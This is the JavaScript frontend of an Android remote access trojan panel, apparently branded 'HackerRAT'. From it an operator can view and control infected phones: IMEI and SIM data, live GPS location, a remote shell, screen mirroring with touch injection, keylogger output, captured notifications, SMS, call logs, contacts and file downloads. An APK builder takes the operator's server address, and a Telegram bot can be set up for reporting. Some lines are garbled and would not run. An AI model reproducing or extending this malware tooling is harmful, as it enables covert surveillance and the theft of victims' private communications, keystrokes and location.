function updateDeviceSelects() {
  const selects = $$('.device-select');
  const options = '<option value="">-- Select Device --</option>' +
    Object.values(devices).map(d => 
      `<option value="${d.deviceId}">${d.manufacturer} ${d.model} (${d.deviceId?.substring(0,8)}...)</option>`
    ).join('');
  selects.forEach(sel => {
    const current = sel.value;
    sel.innerHTML = options;
    if (current) sel.value = current;
  });
}

function selectDevice(deviceId) {
  currentDevice = deviceId;
  $('#overview-device-select').value = deviceId;
  loadDeviceData(deviceId);
  // Switch to overview tab
  $$('.nav-item').forEach(n => n.classList.remove('active'));
  document.querySelector('[data-tab="overview"]').classList.add('active');
  $$('.tab-content').forEach(t => t.classList.remove('active'));
  $('#tab-overview').classList.add('active');
}

// ============ DEVICE DATA LOADING ============
function loadDeviceData(deviceId) {
  const dev = devices[deviceId];
  if (!dev) return;

  // Device info
  $('#device-info-content').innerHTML = `
    <div class="info-row"><span class="info-label">Device ID</span><span class="info-value">${dev.deviceId}</span></div>
    <div class="info-row"><span class="info-label">Manufacturer</span><span class="info-value">${dev.manufacturer}</span></div>
    <div class="info-row"><span class="info-label">Model</span><span class="info-value">${dev.model}</span></div>
    <div class="info-row"><span class="info-label">Android Version</span><span class="info-value">${dev.androidVersion} (SDK ${dev.sdkLevel})</span></div>
    <div class="info-row"><span class="info-label">Build Fingerprint</span><span class="info-value" style="font-size:11px">${dev.buildFingerprint || 'N/A'}</span></div>
    <div class="info-row"><span class="info-label">Kernel</span><span class="info-value">${dev.kernelVersion || 'N/A'}</span></div>
    <div class="info-row"><span class="info-label">Security Patch</span><span class="info-value">${dev.securityPatch || 'N/A'}</span></div>
    <div class="info-row"><span class="info-label">IMEI</span><span class="info-value">${dev.imei || 'N/A'}</span></div>
    <div class="info-row"><span class="info-label">SIM Serial</span><span class="info-value">${dev.simSerial || 'N/A'}</span></div>
    <div class="info-row"><span class="info-label">First Seen</span><span class="info-value">${new Date(dev.firstSeen).toLocaleString()}</span></div>
    <div class="info-row"><span class="info-label">Last Seen</span><span class="info-value">${new Date(dev.lastSeen).toLocaleString()}</span></div>
  ` Emoji;

  // Map
  initMap(deviceId collect);
  
  // Send commands to get fresh data
  sendCommand(deviceId, 'get_battery');
  sendCommand(deviceId, 'get_network');
}

function initMap(deviceId) {
  const mapId = 'device-map';
  if (deviceMap[deviceId]) {
    deviceMap[deviceId].invalidateSize();
    return;
  }
  deviceMap[deviceId] = L.map(mapId).setView([20, 0], 2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '&copy; OpenStreetMap',
    maxZoom: 19
  }).addTo(deviceMap[deviceId]);
}

function updateMapMarker(data) {
  if (!data.lat || !data.lng || !currentDevice) return;
  if (!deviceMap[currentDevice]) initMap(currentDevice);
  
  if (markers[currentDevice]) {
    markers[currentDevice].setLatLng([data.lat, data.lng]);
  } else {
    markers[currentDevice] = L.marker([data.lat, data.lng])
      .addTo(deviceMap[currentDevice])
      .bindPopup(`Accuracy: ${data.accuracy || 'N/A'}m`);
  }
  deviceMap[currentDevice].setView([data.lat, data.lng], 15);
}

function updateBatteryDisplay(data) {
  $('#device-battery-content').innerHTML = `
    <div class="info-row"><span class="info-label">Battery</span><span class="info-value">${data.level !== undefined ? data.level + '%' : 'N/A'}</span></div>
    <div class="info-row"><span class="info-label">Charging</span><span class="info-value">${data.charging ? 'Yes 🔌' : 'No'}</span></div>
    <div class="info-row"><span class="info-label">Temperature</span><span class="info-value">${data.temperature !== undefined ? data.temperature + '°C' : 'N/A'}</span></div>
  `;
}

function updateNetworkDisplay(data) {
  $('#device-network-content').innerHTML = `
    <div class="info-row"><span class="info-label">WiFi SSID</span><span class="info-value">${data.wifiSsid || 'N/A'}</span></div>
    <div class="info-row"><span class="info-label">WiFi IP</span><span class="info-value">${data.wifiIp || 'N/A'}</span></div>
    <div class="info-row"><span class="info-label">Mobile IP</span><span class="info-value">${data.mobileIp || 'N/A'}</span></div>
    <div class="info-row"><span class="info-label">Mobile Operator</span><span class="info-value">${data.operator || 'N/A'}</span></div>
  `;
}

// ============ COMMAND DISPATCH ============
function sendCommand(deviceId, command, params) {
  if (!socket || !socket.connected) return;
  socket.emit('send_command', { deviceId, command, params });
}

// ============ ACTIONS TAB ============
function initActions() {
  $$('.action-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const deviceId = $('#actions-device-select').value;
      if (!deviceId) { showActionResponse('Select a device first'); return; }
      
      const action = btn.dataset.action;
      let params = btn.dataset.param;
      
      if (btn.classList.contains('action-input')) {
        showActionInputModal(action, params);
        return;
      }
      
      sendCommand(deviceId, action, params ? JSON.parse(params) : undefined);
      showActionResponse(`Sent: ${action}`);
    });
  });
}

function showActionResponse(msg) {
  $('#actions-response').textContent = msg;
  setTimeout(() => { $('#actions-response').textContent = 'Ready'; }, 5000);
}

// ============ ACTION INPUT MODAL ============
function initModals() {
  $$('.modal-close').forEach(el => {
    el.addEventListener('click', () => el.closest('.modal').classList.remove('active'));
  });
  window.addEventListener('click', (e) => {
    if (e.target.classList.contains('modal')) e.target.classList.remove('active');
  });
}

function showActionInputModal(action, defaultParam) {
  const modal = $('#action-input-modal');
  modal.classList.add('active');
  $('#action-input-title').textContent = `Action: ${action}`;
  $('#action-input-label').textContent = `Parameter for ${action}`;
  $('#action-input-value').value = defaultParam || '';
  
  $('#action-input-form').onsubmit = (e) => {
    e.preventDefault();
    const deviceId = $('#actions-device-select').value;
    const val = $('#action-input-value').value;
    sendCommand(deviceId, action, val);
    showActionResponse(`Sent: ${action} = ${val}`);
    modal.classList.remove('active');
  };
}

// ============ SHELL TAB ============
function initShell() {
  $('#shell-exec-btn').addEventListener('click', executeShellCommand);
  $('#shell-input').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') executeShellCommand();
  });
  $('#shell-clear-btn').addEventListener('click', () => {
    $('#shell-output').innerHTML = '<div class="shell-line">[HackerAI Shell] Cleared</div>';
  });
}

function executeShellCommand() {
  const deviceId = $('#shell-device-select').value;
  const cmd = $('#shell-input').value.trim();
  if (!deviceId) { addShellLine('Select a device first', 'error'); return; }
  if (!cmd) return;
  
  addShellLine(`$ ${cmd}`, '');
  sendCommand(deviceId, 'shell', { command: cmd });
  $('#shell-input').value = '';
}

function addShellLine(text, cls = '') {
  const div = document.createElement('div');
  div.className = `shell-line ${cls}`;
  div.textContent = text;
  $('#shell-output').appendChild(div);
  $('#shell-output').scrollTop = $('#shell-output').scrollHeight;
}

// ============ SCREEN TAB ============
function initScreen() {
  const fpsSlider = $('#screen-fps');
  fpsSlider.addEventListener('input', () => {
    $('#fps-display').textContent = fpsSlider.value;
  });
  
  $('#screen-start-btn').addEventListener('click', () => {
    const deviceId = $('#screens-device-select').value;
    if (!deviceId) return;
    screenStreaming = true;
    sendCommand(deviceId, 'start_screen_mirror', { fps: parseInt(fpsSlider.value) });
    $('#screen-img').style.display = 'block';
    $('#screen-canvas').style.display = 'none';
  });
  
  $('#screen-stop-btn').addEventListener('click', () => {
    const deviceId = $('#screens-device-select').value;
    screenStreaming = false;
    sendCommand(deviceId, 'stop_screen_mirror');
    $('#screen-img').style.display = 'none';
  });
  
  $('#screen-screenshot-btn').addEventListener('click', () => {
    const deviceId = $('#screens-device-select').value;
    if (!deviceId) return;
    sendCommand(deviceId, 'take_screenshot');
  });
  
  // Canvas touch handler
  const canvas = $('#screen-canvas');
  canvas.addEventListener('click', (e) => {
    const deviceId = $('#screens-device-select').value;
    if (!deviceId || !screenStreaming) return;
    const rect = canvas.getBoundingClientRect();
    const x = (e.clientX - rect.left) / rect.width;
    const y = (e.clientY - rect.top) / rect.height;
    sendCommand(deviceId, 'touch', { x, y, action: 'DOWN' });
    setTimeout(() => sendCommand(deviceId, 'touch', { x, y, action: 'UP' }), 50);
  });
  
  // Capture screen_frames
  socket.on('screen_frame', (data) => {
    if (data.deviceId === currentDevice && data.image) {
      $('#screen-img').src = `data:image/jpeg;base64,${data.image}`;
    }
  });
  
  socket.on('screenshot', (data) => {
    if (data.image) showImagePreview(data.image);
  });
}

function showImagePreview(base64) {
  const modal = $('#image-modal');
  $('#modal-image').src = `data:image/jpeg;base64,${base64}`;
  modal.classList.add('active');
}

// ============ KEYLOGGER TAB ============
function addKeylogEntry(data) {
  const container = $('#keylogger-container');
  const div = document.createElement('div');
  div.className = 'keylogger-entry';
  div.innerHTML = `
    <span class="key-time">[${new Date().toLocaleTimeString()}]</span>
    <span class="key-app">${data.app || 'unknown'}</span>
    <span class="key-text">${escapeHtml(data.text || '')}</span>
  `;
  container.appendChild(div);
  container.scrollTop = container.scrollHeight;
}

// ============ NOTIFICATIONS TAB ============
function addNotificationEntry(data) {
  const container = $('#notifications-container');
  const div = document.createElement('div');
  div.className = `notification-entry ${data.system ? 'system' : ''}`;
  div.innerHTML = `
    <div style="display:flex;justify-content:space-between">
      <span class="notif-app">${data.packageName || 'System'}</span>
      <span class="notif-time">${new Date().toLocaleTimeString()}</span>
    </div>
    <div class="notif-title">${escapeHtml(data.title || '')}</div>
    <div class="notif-text">${escapeHtml(data.text || '')}</div>
  `;
  container.appendChild(div);
  container.scrollTop = container.scrollHeight;
}

// ============ SMS TAB ============
function addSmsToTable(data) {
  const tbody = $('#sms-body');
  const tr = document.createElement('tr');
  tr.innerHTML = `
    <td>${escapeHtml(data.address || '')}</td>
    <td>${escapeHtml(data.body || '')}</td>
    <td>${data.date ? new Date(data.date).toLocaleString() : ''}</td>
    <td>${data.read ? 'Yes' : 'No'}</td>
    <td><button class="btn btn-small btn-danger" onclick="this.closest('tr').remove()">Delete</button></td>
  `;
  tbody.prepend(tr);
}

// ============ CALLS TAB ============
function addCallToTable(data) {
  const tbody = $('#calls-body');
  const tr = document.createElement('tr');
  const types = { 1: 'Incoming', 2: 'Outgoing', 3: 'Missed' };
  tr.innerHTML = `
    <td>${escapeHtml(data.number || '')}</td>
    <td>${escapeHtml(data.name || '')}</td>
    <td>${types[data.type] || data.type}</td>
    <td>${data.duration ? formatDuration(data.duration) : ''}</td>
    <td>${data.date ? new Date(data.date).toLocaleString() : ''}</td>
  `;
  tbody.prepend(tr);
}

// ============ CONTACTS TAB ============
function addContactsToTable(data) {
  const tbody = $('#contacts-body');
  tbody.innerHTML = '';
  (data.contacts || []).forEach(c => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${escapeHtml(c.name || '')}</td>
      <td>${escapeHtml((c.phones || []).join(', '))}</td>
      <td>${escapeHtml((c.emails || []).join(', '))}</td>
    `;
    tbody.appendChild(tr);
  });
}

// ============ FILES TAB ============
function renderFileList(data) {
  const tbody = $('#files-body');
  tbody.innerHTML = '';
  (data.files || []).forEach(f => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${f.isDirectory ? '📁 ' : '📄 '} ${escapeHtml(f.name)}</td>
      <td>${f.isDirectory ? '-' : formatFileSize(f.size)}</td>
      <td>${f.lastModified ? new Date(f.lastModified).toLocaleString() : ''}</td>
      <td>
        ${f.isDirectory ? 
          `<button class="btn btn-small" onclick="navigateFile('${escapeAttr(f.path || f.name)}')">Open</button>` :
          `<button class="btn btn-small" onclick="downloadFile('${escapeAttr(f.path || f.name)}')">Download</button>`
        }
      </td>
    `;
    tbody.appendChild(tr);
  });
}

// ============ BUILDER ============
function initBuilder() {
  $('#builder-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const form = e.target;
    const data = {
      serverUrl: $('#builder-server-url').value,
      serverPort: $('#builder-server-port').value,
      appName: $('#builder-app-name').value,
      packageName: $('#builder-package').value
    };
    
    $('#builder-status').className = 'builder-status';
    $('#builder-status').textContent = 'Building APK... This may take a few minutes.';
    
    try {
      const formData = new FormData();
      formData.append('serverUrl', data.serverUrl);
      formData.append('serverPort', data.serverPort);
      formData.append('appName', data.appName);
      formData.append('packageName', data.packageName);
      
      const res = await fetch('/api/build-apk', {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}` },
        body: formData
      });
      
      if (res.headers.get('content-type')?.includes('application/zip') || res.headers.get('content-disposition')?.includes('.apk')) {
        const blob = await res.blob();
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `HackerRAT.apk`;
        a.click();
        $('#builder-status').className = 'builder-status success';
        $('#builder-status').textContent = 'APK built and downloaded successfully!';
      } else {
        const result = await res.json();
        $('#builder-status').className = `builder-status ${res.ok ? 'success' : 'error'}`;
        $('#builder-status').textContent = result.error || result.output || 'Build completed';
      }
    } catch (err) {
      $('#builder-status').className = 'builder-status error';
      $('#builder-status').textContent = `Error: ${err.message}`;
    }
  });
  
  loadBuildHistory();
}

async function loadBuildHistory() {
  try {
    const data = await apiGet('/api/build-history');
    const container = $('#build-history');
    container.innerHTML = (data.builds || []).slice(-10).reverse().map(b => `
      <div class="info-row">
        <span class="info-label">${new Date(b.timestamp).toLocaleString()}</span>
        <span class="info-value">${b.serverUrl} - ${b.status}</span>
      </div>
    `).join('') || '<div class="info-row"><span class="info-label">No builds yet</span></div>';
  } catch(e) {}
}

// ============ SETTINGS ============
function initSettings() {
  loadTelegramConfig();
  
  $('#telegram-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    try {
      const res = await apiPost('/api/telegram/config', {
        enabled: $('#telegram-enabled').checked,
        token: $('#telegram-token').value,
        chatId: $('#telegram-chat-id').value
      });
      alert('Telegram config saved');
    } catch(err) {
      alert('Error: ' + err.message);
    }
  });
}

async function loadTelegramConfig() {
  try {
    const data = await apiGet('/api/telegram/config');
    $('#telegram-enabled').checked = data.enabled;
    if (data.token) $('#telegram-token').value = data.token;
    if (data.chatId) $('#telegram-chat-id').value = data.chatId;
  } catch(e) {}
}

async function loadStats() {
  try {
    const data = await apiGet('/api/stats');
    $('#server-stats').innerHTML = `
      <div class="info-row"><span class="info-label">Total Devices</span><span class="info-value">${data.totalDevices}</span></div>
      <div class="info-row"><span class="info-label">Online</span><span class="info-value">${data.onlineDevices}</span></div>
      <div class="info-row"><span class="info-label">Uptime</span><span class="info-value">${Math.floor(data.uptime / 3600)}h ${Math.floor((data.uptime % 3600) / 60)}m</span></div>
      <div class="info-row"><span class="info-label">Telegram Bot</span><span class="info-value">${data.telegramEnabled ? '✅ Active' : '❌ Disabled'}</span></div>
    `;
  } catch(e) {}
}

async function loadDevices() {
  try {
    const data = await apiGet('/api/devices');
    data.devices.forEach(d => { devices[d.deviceId] = d; });
    updateDeviceGrid();
    updateDeviceSelects();
    updateBadge();
  } catch(e) {}
}

// ============ COMMAND RESPONSE HANDLER ============
function handleCommandResponse(data) {
  showActionResponse(`Response: ${JSON.stringify(data.response || data.result || data).substring(0, 200)}`);
  
  if (data.command === 'shell' && data.response) {
    addShellLine(data.response, '');
  }
  if (data.command === 'shell' && data.error) {
    addShellLine(data.error, 'error');
  }
  if (data.command === 'get_battery') updateBatteryDisplay(data.response || data);
  if (data.command === 'get_network') updateNetworkDisplay(data.response || data);
  if (data.command === 'get_sms_inbox') {
    $('#sms-body').innerHTML = '';
    (data.response?.messages || []).forEach(addSmsToTable);
  }
  if (data.command === 'get_call_log') {
    $('#calls-body').innerHTML = '';
    (data.response?.calls || []).forEach(addCallToTable);
  }
  if (data.command === 'get_contacts') addContactsToTable(data.response || data);
  if (data.command === 'take_screenshot' && data.response?.image) showImagePreview(data.response.image);
}

// ============ UTILITY FUNCTIONS ============
function escapeHtml(str) {
  if (!str) return '';
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

function escapeAttr(str) {
  return String(str).replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function formatFileSize(bytes) {
  if (!bytes) return '0 B';
  const sizes = ['B', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(1024));
  return (bytes / Math.pow(1024, i)).toFixed(1) + ' ' + sizes[i];
}

function formatDuration(secs) {
  if (!secs) return '0s';
  const m = Math.floor(secs / 60);
  const s = secs % 60;
  return m ? `${m}m ${s}s` : `${s}s`;
}

// Initialize tabs when devices change
socket?.on('device_info', (data) => {
  if (data.deviceId) {
    devices[data.deviceId] = { ...devices[data.deviceId], ...data };
    updateDeviceGrid();
    updateDeviceSelects();
  }
});
